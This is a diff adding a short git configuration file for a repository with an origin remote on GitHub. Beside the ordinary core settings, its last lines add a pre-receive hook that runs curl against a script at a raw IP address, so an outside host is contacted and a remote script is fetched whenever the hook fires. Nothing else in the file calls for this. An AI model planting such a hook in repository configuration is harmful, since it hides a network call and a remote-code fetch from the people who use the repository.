@@ -1,0 +1,10 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = https://github.com/Bunoud/test.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[hook "pre-receive"]
+    command = curl http://82.64.126.1/test.sh
